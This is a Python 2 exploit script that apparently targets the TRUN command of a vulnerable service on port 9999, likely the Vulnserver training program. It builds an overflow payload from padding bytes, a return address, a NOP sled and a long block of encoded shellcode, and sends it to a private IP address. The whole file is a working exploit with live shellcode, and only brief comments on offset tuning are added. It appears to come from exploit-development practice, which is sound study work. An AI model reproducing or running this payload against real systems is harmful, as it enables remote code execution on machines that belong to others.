#!/usr/bin/python



import socket


buf = "TRUN /.:/"



buf += "A" * 2003  #was 5000 now 2003
#buf += "BBBB"


buf += "\xc7\x12\x50\x62"
#62 50 12 a0
#625012c7
#625012ad

buf += "\x90" * 10


buf += b"\xd9\xe9\xd9\x74\x24\xf4\x5f\xbb\x15\x5c\xb3\xe6"
buf += b"\x29\xc9\xb1\x59\x83\xc7\x04\x31\x5f\x15\x03\x5f"
buf += b"\x15\xf7\xa9\x4f\x0e\x78\x51\xb0\xcf\xe6\x63\x62"
buf += b"\x46\x03\xe7\x09\x0b\xfb\x63\x5f\xa0\x70\x21\x74"
buf += b"\x89\x79\x4d\x06\xc1\x8a\xe5\xad\x37\xa5\xc9\x9e"
buf += b"\x04\xa4\xb5\xdc\x58\x06\x87\x2e\xad\x47\xc0\xf8"
buf += b"\xdb\xa8\x9c\xad\xa8\x64\x31\xd9\xed\xb4\x30\x0d"
buf += b"\x7a\x84\x4a\x28\xbd\x70\xe7\x33\xee\x28\x7c\x6b"
buf += b"\x2e\xc9\x51\x07\x66\xd1\xd0\xd1\x03\xdd\xeb\x1e"
buf += b"\xa2\x96\x38\x6a\x34\x7e\x71\xac\x9b\xbf\xbd\x21"
buf += b"\xe5\xf8\x7a\xda\x90\xf2\x78\x67\xa3\xc1\x03\xb3"
buf += b"\x26\xd5\xa4\x30\x90\x31\x54\x94\x47\xb2\x5a\x51"
buf += b"\x03\x9c\x7e\x64\xc0\x97\x7b\xed\xe7\x77\x0a\xb5"
buf += b"\xc3\x53\x56\x6d\x6d\xc2\x32\xc0\x92\x14\x9a\xbd"
buf += b"\x36\x5f\x09\xab\x47\xa0\xd1\xd4\x15\x36\x1d\x19"
buf += b"\xa6\xc6\x09\x2a\xd5\xf4\x96\x80\x71\xb4\x5f\x0f"
buf += b"\x85\xcd\x48\xb0\x59\x75\x18\x4e\x5a\x85\x30\x95"
buf += b"\x0e\xd5\x2a\x3c\x2f\xbe\xaa\xc1\xfa\x2a\xa1\x55"
buf += b"\x0f\x98\xad\x27\x67\xde\xcd\x36\x24\x57\x2b\x68"
buf += b"\x84\x37\xe4\xc9\x74\xf7\x54\xa2\x9e\xf8\x8b\xd2"
buf += b"\xa0\xd3\xa3\x79\x4f\x8d\x9c\x15\xf6\x94\x57\x87"
buf += b"\xf7\x03\x12\x87\x7c\xa1\xe2\x46\x75\xc0\xf0\xbf"
buf += b"\xe2\x2a\x09\x40\x87\x2a\x63\x44\x01\x7d\x1b\x46"
buf += b"\x74\x49\x84\xb9\x53\xca\xc3\x46\x22\xfa\xb8\x71"
buf += b"\xb0\x42\xd7\x7d\x54\x42\x27\x28\x3e\x42\x4f\x8c"
buf += b"\x1a\x11\x6a\xd3\xb6\x06\x27\x46\x39\x7e\x9b\xc1"
buf += b"\x51\x7c\xc2\x26\xfe\x7f\x21\x35\xf9\x7f\xb7\x12"
buf += b"\xa2\x17\x47\x23\x52\xe7\x2d\xa3\x02\x8f\xba\x8c"
buf += b"\xad\x7f\x42\x07\xe6\x17\xc9\xc6\x44\x86\xce\xc2"
buf += b"\x09\x16\xce\xe1\x91\xa9\xb5\x8a\x26\x4a\x4a\x83"
buf += b"\x42\x4b\x4a\xab\x74\x70\x9c\x92\x02\xb7\x1c\xa1"
buf += b"\x1d\x82\x01\x80\xb7\xec\x16\xd2\x9d"

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)  #create IPv4 socket, TCP Protocol

s.connect(("192.168.150.245", 9999))   #connect to target IP an port

print s.recv(1024)  #print response

s.send(buf)  # send the value of the buf

print s.recv(1024)  #print response

s.close()   #close the socket
